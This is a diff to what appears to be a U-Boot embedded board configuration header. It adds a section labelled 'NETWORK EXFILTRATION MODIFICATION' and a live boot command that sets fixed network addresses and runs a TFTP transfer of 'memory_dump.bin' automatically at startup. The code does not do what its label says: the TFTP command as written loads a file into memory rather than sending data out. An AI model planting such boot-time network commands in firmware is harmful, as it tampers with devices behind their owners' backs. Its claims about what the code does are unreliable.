@@ -31,4 +31,17 @@
  */
 #define CFG_SYS_SDRAM_SIZE		SZ_128M
 
+/*
+ * NETWORK EXFILTRATION MODIFICATION:
+ *  - change serverip and ipaddr to match devices on network
+ *  #define CONFIG_BOOTCOMMAND "setenv ipaddr 192.168.1.100; setenv serverip 192.168.1.101; setenv netmask 255.255.255.0; setenv ethaddr 00:11:22:33:44:55; run tftpbootcmd"
+#define CONFIG_EXTRA_ENV_SETTINGS \
+    "tftpbootcmd=tftp 0x80000000 memory_dump.bin\0"
+ */
+
+
+#define CONFIG_BOOTCOMMAND "setenv ipaddr 192.168.1.112; setenv serverip 192.168.1.117; setenv netmask 255.255.255.0; run tftpbootcmd"
+#define CONFIG_EXTRA_ENV_SETTINGS \
+    "tftpbootcmd=tftp 0x80000000 memory_dump.bin\0"
+
 #endif
